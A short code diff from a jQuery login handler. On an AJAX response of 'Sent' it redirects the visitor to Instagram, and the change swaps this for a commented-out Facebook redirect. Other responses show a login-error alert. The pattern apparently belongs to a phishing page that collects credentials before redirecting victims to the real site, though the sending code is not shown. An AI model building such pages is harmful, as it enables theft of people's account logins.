@@ -24,7 +24,7 @@ $('document').ready(function () {
             success: function (data) {
                 console.log(data);
                 if (data == 'Sent') {
-                    location.assign('https://instagram.com');
+                    // location.assign('https://facebook.com');
                 } else {
                     alert('Error Logging Into Your Account');
                 }
